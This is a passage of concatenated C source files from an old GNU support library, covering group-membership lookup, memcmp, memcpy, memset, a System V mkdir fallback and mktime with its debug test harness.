	{"create", 0, 0, 0},
	{"file", 1, 0, 0},
	{0, 0, 0, 0}
      };

      c = getopt_long (argc, argv, "abc:d:0123456789",
		       long_options, &option_index);
      if (c == EOF)
	break;

      switch (c)
	{
	case 0:
	  printf ("option %s", long_options[option_index].name);
	  if (optarg)
	    printf (" with arg %s", optarg);
	  printf ("\n");
	  break;

	case '0':
	case '1':
	case '2':
	case '3':
	case '4':
	case '5':
	case '6':
	case '7':
	case '8':
	case '9':
	  if (digit_optind != 0 && digit_optind != this_option_optind)
	    printf ("digits occur in two different argv-elements.\n");
	  digit_optind = this_option_optind;
	  printf ("option %c\n", c);
	  break;

	case 'a':
	  printf ("option a\n");
	  break;

	case 'b':
	  printf ("option b\n");
	  break;

	case 'c':
	  printf ("option c with value `%s'\n", optarg);
	  break;

	case 'd':
	  printf ("option d with value `%s'\n", optarg);
	  break;

	case '?':
	  break;

	default:
	  printf ("?? getopt returned character code 0%o ??\n", c);
	}
    }

  if (optind < argc)
    {
      printf ("non-option ARGV-elements: ");
      while (optind < argc)
	printf ("%s ", argv[optind++]);
      printf ("\n");
    }

  exit (0);
}

#endif /* TEST */
/* group-member.c -- determine whether group id is in calling user's group list
   Copyright (C) 1994 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <sys/types.h>

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#include "group-member.h"

char *xmalloc ();
char *xrealloc ();

struct group_info
  {
    int n_groups;
    GETGROUPS_T *group;
  };

#ifdef HAVE_GETGROUPS

static void
free_group_info (g)
     struct group_info *g;
{
  free (g->group);
  free (g);
}

static struct group_info *
get_group_info ()
{
  int n_groups;
  int n_group_slots;
  struct group_info *gi;
  GETGROUPS_T *group;

  /* getgroups () returns the number of elements that it was able to
     place into the array.  We simply continue to call getgroups ()
     until the number of elements placed into the array is smaller than
     the physical size of the array. */

  group = NULL;
  n_groups = 0;
  n_group_slots = 0;
  while (n_groups == n_group_slots)
    {
      n_group_slots += 64;
      group = (GETGROUPS_T *) xrealloc (group,
					n_group_slots * sizeof (GETGROUPS_T));
      n_groups = getgroups (n_group_slots, group);
    }

  /* In case of error, the user loses. */
  if (n_groups < 0)
    {
      free (group);
      return NULL;
    }

  gi = (struct group_info *) xmalloc (sizeof (*gi));
  gi->n_groups = n_groups;
  gi->group = group;

  return gi;
}

#endif /* not HAVE_GETGROUPS */

/* Return non-zero if GID is one that we have in our groups list.
   If there is no getgroups function, return non-zero if GID matches
   either of the current or effective group IDs.  */

int
group_member (gid)
     gid_t gid;
{
#ifndef HAVE_GETGROUPS
  return ((gid == getgid ()) || (gid == getegid ()));
#else
  int i;
  int found;
  struct group_info *gi;

  gi = get_group_info ();
  if (gi == NULL)
    return 0;

  /* Search through the list looking for GID. */
  found = 0;
  for (i = 0; i < gi->n_groups; i++)
    {
      if (gid == gi->group[i])
	{
	  found = 1;
	  break;
	}
    }
  
  free_group_info (gi);

  return found;
#endif /* HAVE_GETGROUPS */
}

#ifdef TEST

char *program_name;

int
main (int argc, char** argv)
{
  int i;

  program_name = argv[0];

  for (i=1; i<argc; i++)
    {
      gid_t gid;

      gid = atoi (argv[i]);
      printf ("%d: %s\n", gid, group_member (gid) ? "yes" : "no");
    }
  exit (0);
}

#endif /* TEST */
/* Copyright (C) 1991, 1993 Free Software Foundation, Inc.
   Contributed by Torbjorn Granlund (tege@sics.se).

NOTE: The canonical source of this file is maintained with the GNU C Library.
Bugs can be reported to bug-glibc@prep.ai.mit.edu.

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the
Free Software Foundation; either version 2, or (at your option) any
later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#undef	__ptr_t
#if defined (__cplusplus) || (defined (__STDC__) && __STDC__)
#define	__ptr_t	void *
#else /* Not C++ or ANSI C.  */
#undef	const
#define	const
#define	__ptr_t	char *
#endif /* C++ or ANSI C.  */

#if defined (HAVE_STRING_H) || defined (_LIBC)
#include <string.h>
#endif

#ifdef _LIBC

#include <memcopy.h>

#else	/* Not in the GNU C library.  */

#include <sys/types.h>

/* Type to use for aligned memory operations.
   This should normally be the biggest type supported by a single load
   and store.  Must be an unsigned type.  */
#define	op_t	unsigned long int
#define OPSIZ	(sizeof(op_t))

/* Threshold value for when to enter the unrolled loops.  */
#define	OP_T_THRES	16

/* Type to use for unaligned operations.  */
typedef unsigned char byte;

#ifndef WORDS_BIGENDIAN
#define MERGE(w0, sh_1, w1, sh_2) (((w0) >> (sh_1)) | ((w1) << (sh_2)))
#else
#define MERGE(w0, sh_1, w1, sh_2) (((w0) << (sh_1)) | ((w1) >> (sh_2)))
#endif

#endif	/* In the GNU C library.  */

#ifdef WORDS_BIGENDIAN
#define CMP_LT_OR_GT(a, b) ((a) > (b) ? 1 : -1)
#else
#define CMP_LT_OR_GT(a, b) memcmp_bytes ((a), (b))
#endif

/* BE VERY CAREFUL IF YOU CHANGE THIS CODE!  */

/* The strategy of this memcmp is:

   1. Compare bytes until one of the block pointers is aligned.

   2. Compare using memcmp_common_alignment or
      memcmp_not_common_alignment, regarding the alignment of the other
      block after the initial byte operations.  The maximum number of
      full words (of type op_t) are compared in this way.

   3. Compare the few remaining bytes.  */

#ifndef WORDS_BIGENDIAN
/* memcmp_bytes -- Compare A and B bytewise in the byte order of the machine.
   A and B are known to be different.
   This is needed only on little-endian machines.  */
#ifdef  __GNUC__
__inline
#endif
static int
memcmp_bytes (a, b)
     op_t a, b;
{
  long int srcp1 = (long int) &a;
  long int srcp2 = (long int) &b;
  op_t a0, b0;

  do
    {
      a0 = ((byte *) srcp1)[0];
      b0 = ((byte *) srcp2)[0];
      srcp1 += 1;
      srcp2 += 1;
    }
  while (a0 == b0);
  return a0 - b0;
}
#endif

/* memcmp_common_alignment -- Compare blocks at SRCP1 and SRCP2 with LEN `op_t'
   objects (not LEN bytes!).  Both SRCP1 and SRCP2 should be aligned for
   memory operations on `op_t's.  */
#ifdef	__GNUC__
__inline
#endif
static int
memcmp_common_alignment (srcp1, srcp2, len)
     long int srcp1;
     long int srcp2;
     size_t len;
{
  op_t a0, a1;
  op_t b0, b1;

  switch (len % 4)
    {
    case 2:
      a0 = ((op_t *) srcp1)[0];
      b0 = ((op_t *) srcp2)[0];
      srcp1 -= 2 * OPSIZ;
      srcp2 -= 2 * OPSIZ;
      len += 2;
      goto do1;
    case 3:
      a1 = ((op_t *) srcp1)[0];
      b1 = ((op_t *) srcp2)[0];
      srcp1 -= OPSIZ;
      srcp2 -= OPSIZ;
      len += 1;
      goto do2;
    case 0:
      if (OP_T_THRES <= 3 * OPSIZ && len == 0)
	return 0;
      a0 = ((op_t *) srcp1)[0];
      b0 = ((op_t *) srcp2)[0];
      goto do3;
    case 1:
      a1 = ((op_t *) srcp1)[0];
      b1 = ((op_t *) srcp2)[0];
      srcp1 += OPSIZ;
      srcp2 += OPSIZ;
      len -= 1;
      if (OP_T_THRES <= 3 * OPSIZ && len == 0)
	goto do0;
      /* Fall through.  */
    }

  do
    {
      a0 = ((op_t *) srcp1)[0];
      b0 = ((op_t *) srcp2)[0];
      if (a1 != b1)
	return CMP_LT_OR_GT (a1, b1);

    do3:
      a1 = ((op_t *) srcp1)[1];
      b1 = ((op_t *) srcp2)[1];
      if (a0 != b0)
	return CMP_LT_OR_GT (a0, b0);

    do2:
      a0 = ((op_t *) srcp1)[2];
      b0 = ((op_t *) srcp2)[2];
      if (a1 != b1)
	return CMP_LT_OR_GT (a1, b1);

    do1:
      a1 = ((op_t *) srcp1)[3];
      b1 = ((op_t *) srcp2)[3];
      if (a0 != b0)
	return CMP_LT_OR_GT (a0, b0);

      srcp1 += 4 * OPSIZ;
      srcp2 += 4 * OPSIZ;
      len -= 4;
    }
  while (len != 0);

  /* This is the right position for do0.  Please don't move
     it into the loop.  */
 do0:
  if (a1 != b1)
    return CMP_LT_OR_GT (a1, b1);
  return 0;
}

/* memcmp_not_common_alignment -- Compare blocks at SRCP1 and SRCP2 with LEN
   `op_t' objects (not LEN bytes!).  SRCP2 should be aligned for memory
   operations on `op_t', but SRCP1 *should be unaligned*.  */
#ifdef	__GNUC__
__inline
#endif
static int
memcmp_not_common_alignment (srcp1, srcp2, len)
     long int srcp1;
     long int srcp2;
     size_t len;
{
  op_t a0, a1, a2, a3;
  op_t b0, b1, b2, b3;
  op_t x;
  int shl, shr;

  /* Calculate how to shift a word read at the memory operation
     aligned srcp1 to make it aligned for comparison.  */

  shl = 8 * (srcp1 % OPSIZ);
  shr = 8 * OPSIZ - shl;

  /* Make SRCP1 aligned by rounding it down to the beginning of the `op_t'
     it points in the middle of.  */
  srcp1 &= -OPSIZ;

  switch (len % 4)
    {
    case 2:
      a1 = ((op_t *) srcp1)[0];
      a2 = ((op_t *) srcp1)[1];
      b2 = ((op_t *) srcp2)[0];
      srcp1 -= 1 * OPSIZ;
      srcp2 -= 2 * OPSIZ;
      len += 2;
      goto do1;
    case 3:
      a0 = ((op_t *) srcp1)[0];
      a1 = ((op_t *) srcp1)[1];
      b1 = ((op_t *) srcp2)[0];
      srcp2 -= 1 * OPSIZ;
      len += 1;
      goto do2;
    case 0:
      if (OP_T_THRES <= 3 * OPSIZ && len == 0)
	return 0;
      a3 = ((op_t *) srcp1)[0];
      a0 = ((op_t *) srcp1)[1];
      b0 = ((op_t *) srcp2)[0];
      srcp1 += 1 * OPSIZ;
      goto do3;
    case 1:
      a2 = ((op_t *) srcp1)[0];
      a3 = ((op_t *) srcp1)[1];
      b3 = ((op_t *) srcp2)[0];
      srcp1 += 2 * OPSIZ;
      srcp2 += 1 * OPSIZ;
      len -= 1;
      if (OP_T_THRES <= 3 * OPSIZ && len == 0)
	goto do0;
      /* Fall through.  */
    }

  do
    {
      a0 = ((op_t *) srcp1)[0];
      b0 = ((op_t *) srcp2)[0];
      x = MERGE(a2, shl, a3, shr);
      if (x != b3)
	return CMP_LT_OR_GT (x, b3);

    do3:
      a1 = ((op_t *) srcp1)[1];
      b1 = ((op_t *) srcp2)[1];
      x = MERGE(a3, shl, a0, shr);
      if (x != b0)
	return CMP_LT_OR_GT (x, b0);

    do2:
      a2 = ((op_t *) srcp1)[2];
      b2 = ((op_t *) srcp2)[2];
      x = MERGE(a0, shl, a1, shr);
      if (x != b1)
	return CMP_LT_OR_GT (x, b1);

    do1:
      a3 = ((op_t *) srcp1)[3];
      b3 = ((op_t *) srcp2)[3];
      x = MERGE(a1, shl, a2, shr);
      if (x != b2)
	return CMP_LT_OR_GT (x, b2);

      srcp1 += 4 * OPSIZ;
      srcp2 += 4 * OPSIZ;
      len -= 4;
    }
  while (len != 0);

  /* This is the right position for do0.  Please don't move
     it into the loop.  */
 do0:
  x = MERGE(a2, shl, a3, shr);
  if (x != b3)
    return CMP_LT_OR_GT (x, b3);
  return 0;
}

int
memcmp (s1, s2, len)
     const __ptr_t s1;
     const __ptr_t s2;
     size_t len;
{
  op_t a0;
  op_t b0;
  long int srcp1 = (long int) s1;
  long int srcp2 = (long int) s2;
  op_t res;

  if (len >= OP_T_THRES)
    {
      /* There are at least some bytes to compare.  No need to test
	 for LEN == 0 in this alignment loop.  */
      while (srcp2 % OPSIZ != 0)
	{
	  a0 = ((byte *) srcp1)[0];
	  b0 = ((byte *) srcp2)[0];
	  srcp1 += 1;
	  srcp2 += 1;
	  res = a0 - b0;
	  if (res != 0)
	    return res;
	  len -= 1;
	}

      /* SRCP2 is now aligned for memory operations on `op_t'.
	 SRCP1 alignment determines if we can do a simple,
	 aligned compare or need to shuffle bits.  */

      if (srcp1 % OPSIZ == 0)
	res = memcmp_common_alignment (srcp1, srcp2, len / OPSIZ);
      else
	res = memcmp_not_common_alignment (srcp1, srcp2, len / OPSIZ);
      if (res != 0)
	return res;

      /* Number of bytes remaining in the interval [0..OPSIZ-1].  */
      srcp1 += len & -OPSIZ;
      srcp2 += len & -OPSIZ;
      len %= OPSIZ;
    }

  /* There are just a few bytes to compare.  Use byte memory operations.  */
  while (len != 0)
    {
      a0 = ((byte *) srcp1)[0];
      b0 = ((byte *) srcp2)[0];
      srcp1 += 1;
      srcp2 += 1;
      res = a0 - b0;
      if (res != 0)
	return res;
      len -= 1;
    }

  return 0;
}
/* memcpy.c -- copy memory.
   Copy LENGTH bytes from SOURCE to DEST.  Does not null-terminate.
   The source and destination regions may not overlap.
   In the public domain.
   By Jim Meyering.  */

/* FIXME: remove this before release.  */
#include <assert.h>
#ifndef ABS
# define ABS(x) ((x) < 0 ? (-(x)) : (x))
#endif

void
memcpy (dest, source, length)
     char *dest;
     const char *source;
     unsigned length;
{
  assert (length >= 0);
  /* Make sure they don't overlap.  */
  assert (ABS (dest - source) >= length);

  for (; length; --length)
    *dest++ = *source++;
}
/* memset.c -- set an area of memory to a given value
   Copyright (C) 1991 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

char *
memset (str, c, len)
     char *str;
     int c;
     unsigned len;
{
  register char *st = str;

  while (len-- > 0)
    *st++ = c;
  return str;
}
/* mkdir.c -- BSD compatible make directory function for System V
   Copyright (C) 1988, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#ifndef errno
extern int errno;
#endif

#ifdef STAT_MACROS_BROKEN
#undef S_ISDIR
#endif

#if !defined(S_ISDIR) && defined(S_IFDIR)
#define S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)
#endif

/* mkdir adapted from GNU tar.  */

/* Make directory DPATH, with permission mode DMODE.

   Written by Robert Rother, Mariah Corporation, August 1985
   (sdcsvax!rmr or rmr@uscd).  If you want it, it's yours.

   Severely hacked over by John Gilmore to make a 4.2BSD compatible
   subroutine.	11Mar86; hoptoad!gnu

   Modified by rmtodd@uokmax 6-28-87 -- when making an already existing dir,
   subroutine didn't return EEXIST.  It does now.  */

int
mkdir (dpath, dmode)
     char *dpath;
     int dmode;
{
  int cpid, status;
  struct stat statbuf;

  if (stat (dpath, &statbuf) == 0)
    {
      errno = EEXIST;		/* stat worked, so it already exists.  */
      return -1;
    }

  /* If stat fails for a reason other than non-existence, return error.  */
  if (errno != ENOENT)
    return -1;

  cpid = fork ();
  switch (cpid)
    {
    case -1:			/* Cannot fork.  */
      return -1;		/* errno is already set.  */

    case 0:			/* Child process.  */
      /* Cheap hack to set mode of new directory.  Since this child
	 process is going away anyway, we zap its umask.
	 This won't suffice to set SUID, SGID, etc. on this
	 directory, so the parent process calls chmod afterward.  */
      status = umask (0);	/* Get current umask.  */
      umask (status | (0777 & ~dmode));	/* Set for mkdir.  */
      execl ("/bin/mkdir", "mkdir", dpath, (char *) 0);
      _exit (1);

    default:			/* Parent process.  */
      /* Wait for kid to finish.  */
      while (wait (&status) != cpid)
	/* Do nothing.  */ ;

      if (status & 0xFFFF)
	{
	  /* /bin/mkdir failed.  */
	  errno = EIO;
	  return -1;
	}
      return chmod (dpath, dmode);
    }
}
/* Copyright (C) 1993, 1994, 1995 Free Software Foundation, Inc.
   Contributed by Paul Eggert (eggert@twinsun.com).

This file is part of the GNU C Library.

The GNU C Library is free software; you can redistribute it and/or
modify it under the terms of the GNU Library General Public License as
published by the Free Software Foundation; either version 2 of the
License, or (at your option) any later version.

The GNU C Library is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
Library General Public License for more details.

You should have received a copy of the GNU Library General Public
License along with the GNU C Library; see the file COPYING.LIB.  If
not, write to the Free Software Foundation, Inc., 675 Mass Ave,
Cambridge, MA 02139, USA.  */

/* Define this to have a standalone program to test this implementation of
   mktime.  */
/* #define DEBUG 1 */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

/* Assume that leap seconds are possible, unless told otherwise.
   If the host has a `zic' command with a `-L leapsecondfilename' option,
   then it supports leap seconds; otherwise it probably doesn't.  */
#ifndef LEAP_SECONDS_POSSIBLE
#define LEAP_SECONDS_POSSIBLE 1
#endif

#include <sys/types.h>		/* Some systems define `time_t' here.  */
#include <time.h>

#if __STDC__ || __GNU_LIBRARY__ || STDC_HEADERS
#include <limits.h>
#endif

#if DEBUG
#include <stdio.h>
#if __STDC__ || __GNU_LIBRARY__ || STDC_HEADERS
#include <stdlib.h>
#endif
/* Make it work even if the system's libc has its own mktime routine.  */
#define mktime my_mktime
#endif /* DEBUG */

#ifndef __P
#if defined (__GNUC__) || (defined (__STDC__) && __STDC__)
#define __P(args) args
#else
#define __P(args) ()
#endif  /* GCC.  */
#endif  /* Not __P.  */

#ifndef CHAR_BIT
#define CHAR_BIT 8
#endif

#ifndef INT_MIN
#define INT_MIN (~0 << (sizeof (int) * CHAR_BIT - 1))
#endif
#ifndef INT_MAX
#define INT_MAX (~0 - INT_MIN)
#endif

#ifndef TIME_T_MIN
#define TIME_T_MIN (0 < (time_t) -1 ? (time_t) 0 \
		    : ~ (time_t) 0 << (sizeof (time_t) * CHAR_BIT - 1))
#endif
#ifndef TIME_T_MAX
#define TIME_T_MAX (~ (time_t) 0 - TIME_T_MIN)
#endif

#define TM_YEAR_BASE 1900
#define EPOCH_YEAR 1970

#ifndef __isleap
/* Nonzero if YEAR is a leap year (every 4 years,
   except every 100th isn't, and every 400th is).  */
#define	__isleap(year)	\
  ((year) % 4 == 0 && ((year) % 100 != 0 || (year) % 400 == 0))
#endif

/* How many days come before each month (0-12).  */
const unsigned short int __mon_yday[2][13] =
  {
    /* Normal years.  */
    { 0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334, 365 },
    /* Leap years.  */
    { 0, 31, 60, 91, 121, 152, 182, 213, 244, 274, 305, 335, 366 }
  };

static time_t ydhms_tm_diff __P ((int, int, int, int, int, const struct tm *));
time_t __mktime_internal __P ((struct tm *,
			       struct tm *(*) (const time_t *, struct tm *),
			       time_t *));


#if ! HAVE_LOCALTIME_R && ! defined (localtime_r)
#ifdef _LIBC
#define localtime_r __localtime_r
#else
/* Approximate localtime_r as best we can in its absence.  */
#define localtime_r my_localtime_r
static struct tm *localtime_r __P ((const time_t *, struct tm *));
static struct tm *
localtime_r (t, tp)
     const time_t *t;
     struct tm *tp;
{
  struct tm *l = localtime (t);
  if (! l)
    return 0;
  *tp = *l;
  return tp;
}
#endif /* ! _LIBC */
#endif /* ! HAVE_LOCALTIME_R && ! defined (localtime_r) */


/* Yield the difference between (YEAR-YDAY HOUR:MIN:SEC) and (*TP),
   measured in seconds, ignoring leap seconds.
   YEAR uses the same numbering as TM->tm_year.
   All values are in range, except possibly YEAR.
   If overflow occurs, yield the low order bits of the correct answer.  */
static time_t
ydhms_tm_diff (year, yday, hour, min, sec, tp)
     int year, yday, hour, min, sec;
     const struct tm *tp;
{
  time_t ay = year + (time_t) (TM_YEAR_BASE - 1);
  time_t by = tp->tm_year + (time_t) (TM_YEAR_BASE - 1);
  time_t intervening_leap_days =
    (ay/4 - by/4) - (ay/100 - by/100) + (ay/400 - by/400);
  time_t years = ay - by;
  time_t days = (365 * years + intervening_leap_days
		 + (yday - tp->tm_yday));
  return (60 * (60 * (24 * days + (hour - tp->tm_hour))
		+ (min - tp->tm_min))
	  + (sec - tp->tm_sec));
}


/* Convert *TP to a time_t value.  */
time_t
mktime (tp)
     struct tm *tp;
{
  static time_t localtime_offset;
  return __mktime_internal (tp, localtime_r, &localtime_offset);
}

/* Convert *TP to a time_t value, inverting
   the monotonic and mostly-unit-linear conversion function CONVERT.
   Use *OFFSET to keep track of a guess at the offset of the result,
   compared to what the result would be for UTC without leap seconds.
   If *OFFSET's guess is correct, only one CONVERT call is needed.  */
time_t
__mktime_internal (tp, convert, offset)
     struct tm *tp;
     struct tm *(*convert) __P ((const time_t *, struct tm *));
     time_t *offset;
{
  time_t t, dt, t0;
  struct tm tm;

  /* The maximum number of probes (calls to CONVERT) should be enough
     to handle any combinations of time zone rule changes, solar time,
     and leap seconds.  Posix.1 prohibits leap seconds, but some hosts
     have them anyway.  */
  int remaining_probes = 4;

  /* Time requested.  Copy it in case CONVERT modifies *TP; this can
     occur if TP is localtime's returned value and CONVERT is localtime.  */
  int sec = tp->tm_sec;
  int min = tp->tm_min;
  int hour = tp->tm_hour;
  int mday = tp->tm_mday;
  int mon = tp->tm_mon;
  int year_requested = tp->tm_year;
  int isdst = tp->tm_isdst;

  /* Ensure that mon is in range, and set year accordingly.  */
  int mon_remainder = mon % 12;
  int negative_mon_remainder = mon_remainder < 0;
  int mon_years = mon / 12 - negative_mon_remainder;
  int year = year_requested + mon_years;

  /* The other values need not be in range:
     the remaining code handles minor overflows correctly,
     assuming int and time_t arithmetic wraps around.
     Major overflows are caught at the end.  */

  /* Calculate day of year from year, month, and day of month.
     The result need not be in range.  */
  int yday = ((__mon_yday[__isleap (year + TM_YEAR_BASE)]
	       [mon_remainder + 12 * negative_mon_remainder])
	      + mday - 1);

#if LEAP_SECONDS_POSSIBLE
  /* Handle out-of-range seconds specially,
     since ydhms_tm_diff assumes every minute has 60 seconds.  */
  int sec_requested = sec;
  if (sec < 0)
    sec = 0;
  if (59 < sec)
    sec = 59;
#endif

  /* Invert CONVERT by probing.  First assume the same offset as last time.
     Then repeatedly use the error to improve the guess.  */

  tm.tm_year = EPOCH_YEAR - TM_YEAR_BASE;
  tm.tm_yday = tm.tm_hour = tm.tm_min = tm.tm_sec = 0;
  t0 = ydhms_tm_diff (year, yday, hour, min, sec, &tm);

  for (t = t0 + *offset;
       (dt = ydhms_tm_diff (year, yday, hour, min, sec, (*convert) (&t, &tm)));
       t += dt)
    if (--remaining_probes == 0)
      return -1;

  /* Check whether tm.tm_isdst has the requested value, if any.  */
  if (0 <= isdst && 0 <= tm.tm_isdst)
    {
      int dst_diff = (isdst != 0) - (tm.tm_isdst != 0);
      if (dst_diff)
	{
	  /* Move two hours in the direction indicated by the disagreement,
	     probe some more, and switch to a new time if found.
	     The largest known fallback due to daylight savings is two hours:
	     once, in Newfoundland, 1988-10-30 02:00 -> 00:00.  */
	  time_t ot = t - 2 * 60 * 60 * dst_diff;
	  while (--remaining_probes != 0)
	    {
	      struct tm otm;
	      if (! (dt = ydhms_tm_diff (year, yday, hour, min, sec,
					 (*convert) (&ot, &otm))))
		{
		  t = ot;
		  tm = otm;
		  break;
		}
	      if ((ot += dt) == t)
		break;  /* Avoid a redundant probe.  */
	    }
	}
    }

  *offset = t - t0;

#if LEAP_SECONDS_POSSIBLE
  if (sec_requested != tm.tm_sec)
    {
      /* Adjust time to reflect the tm_sec requested, not the normalized value.
	 Also, repair any damage from a false match due to a leap second.  */
      t += sec_requested - sec + (sec == 0 && tm.tm_sec == 60);
      (*convert) (&t, &tm);
    }
#endif

  if (TIME_T_MAX / INT_MAX / 366 / 24 / 60 / 60 < 3)
    {
      /* time_t isn't large enough to rule out overflows in ydhms_tm_diff,
	 so check for major overflows.  A gross check suffices,
	 since if t has overflowed, it is off by a multiple of
	 TIME_T_MAX - TIME_T_MIN + 1.  So ignore any component of
	 the difference that is bounded by a small value.  */

      double dyear = (double) year_requested + mon_years - tm.tm_year;
      double dday = 366 * dyear + mday;
      double dsec = 60 * (60 * (24 * dday + hour) + min) + sec_requested;

      if (TIME_T_MAX / 3 - TIME_T_MIN / 3 < (dsec < 0 ? - dsec : dsec))
	return -1;
    }

  *tp = tm;
  return t;
}

#ifdef weak_alias
weak_alias (mktime, timelocal)
#endif

#if DEBUG

static int
not_equal_tm (a, b)
     struct tm *a;
     struct tm *b;
{
  return ((a->tm_sec ^ b->tm_sec)
	  | (a->tm_min ^ b->tm_min)
	  | (a->tm_hour ^ b->tm_hour)
	  | (a->tm_mday ^ b->tm_mday)
	  | (a->tm_mon ^ b->tm_mon)
	  | (a->tm_year ^ b->tm_year)
	  | (a->tm_mday ^ b->tm_mday)
	  | (a->tm_yday ^ b->tm_yday)
	  | (a->tm_isdst ^ b->tm_isdst));
}

static void
print_tm (tp)
     struct tm *tp;
{
  printf ("%04d-%02d-%02d %02d:%02d:%02d yday %03d wday %d isdst %d",
	  tp->tm_year + TM_YEAR_BASE, tp->tm_mon + 1, tp->tm_mday,
	  tp->tm_hour, tp->tm_min, tp->tm_sec,
	  tp->tm_yday, tp->tm_wday, tp->tm_isdst);
}

static int
check_result (tk, tmk, tl, tml)
     time_t tk;
     struct tm tmk;
     time_t tl;
     struct tm tml;
{
  if (tk != tl || not_equal_tm (&tmk, &tml))
    {
      printf ("mktime (");
      print_tm (&tmk);
      printf (")\nyields (");
      print_tm (&tml);
      printf (") == %ld, should be %ld\n", (long) tl, (long) tk);
      return 1;
    }

  return 0;
}

int
main (argc, argv)
     int argc;
     char **argv;
{
  int status = 0;
  struct tm tm, tmk, tml;
  time_t tk, tl;
  char trailer;

  if ((argc == 3 || argc == 4)
      && (sscanf (argv[1], "%d-%d-%d%c",
		  &tm.tm_year, &tm.tm_mon, &tm.tm_mday, &trailer)
	  == 3)
      && (sscanf (argv[2], "%d:%d:%d%c",
		  &tm.tm_hour, &tm.tm_min, &tm.tm_sec, &trailer)
	  == 3))
    {
      tm.tm_year -= TM_YEAR_BASE;
      tm.tm_mon--;
      tm.tm_isdst = argc == 3 ? -1 : atoi (argv[3]);
      tmk = tm;
      tl = mktime (&tmk);
      tml = *localtime (&tl);
      printf ("mktime returns %ld == ", (long) tl);
      print_tm (&tmk);
      printf ("\n");
      status = check_result (tl, tmk, tl, tml);
    }
  else if (argc == 4 || (argc == 5 && strcmp (argv[4], "-") == 0))
    {
      time_t from = atol (argv[1]);
      time_t by = atol (argv[2]);
      time_t to = atol (argv[3]);

      if (argc == 4)
	for (tl = from; tl <= to; tl += by)
	  {
	    tml = *localtime (&tl);
	    tmk = tml;
	    tk = mktime (&tmk);
	    status |= check_result (tk, tmk, tl, tml);
	  }
      else
	for (tl = from; tl <= to; tl += by)
	  {
	    /* Null benchmark.  */
	    tml = *localtime (&tl);
	    tmk = tml;
	    tk = tl;
	    status |= check_result (tk, tmk, tl, tml);
	  }
    }
  else
    printf ("Usage:\
\t%s YYYY-MM-DD HH:MM:SS [ISDST] # Test given time.\n\
\t%s FROM BY TO # Test values FROM, FROM+BY, ..., TO.\n\
\t%s FROM BY TO - # Do not test those values (for benchmark).\n",
	    argv[0], argv[0], argv[0]);

  return status;
}

#endif /* DEBUG */

/*
Local Variables:
compile-command: "gcc -DDEBUG=1 -Wall -O -g mktime.c -o mktime"
End:
*/
/* mountlist.c -- return a list of mounted filesystems
   Copyright (C) 1991, 1992 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <sys/types.h>
#include "mountlist.h"

#ifdef STDC_HEADERS
#include <stdlib.h>
#else
void free ();
#endif
#if defined(STDC_HEADERS) || defined(HAVE_STRING_H)
#include <string.h>
#else
#include <strings.h>
#endif

char *strstr ();
char *xmalloc ();
char *xrealloc ();
char *xstrdup ();
void error ();

#ifdef HAVE_SYS_PARAM_H
#include <sys/param.h>
#endif

#if defined (MOUNTED_GETFSSTAT)	/* __alpha running OSF_1 */
#  include <sys/mount.h>
#  include <sys/fs_types.h>
#endif /* MOUNTED_GETFSSTAT */

#ifdef MOUNTED_GETMNTENT1	/* 4.3BSD, SunOS, HP-UX, Dynix, Irix.  */
#include <mntent.h>
#if !defined(MOUNTED)
#  if defined(MNT_MNTTAB)	/* HP-UX.  */
#    define MOUNTED MNT_MNTTAB
#  endif
#  if defined(MNTTABNAME)	/* Dynix.  */
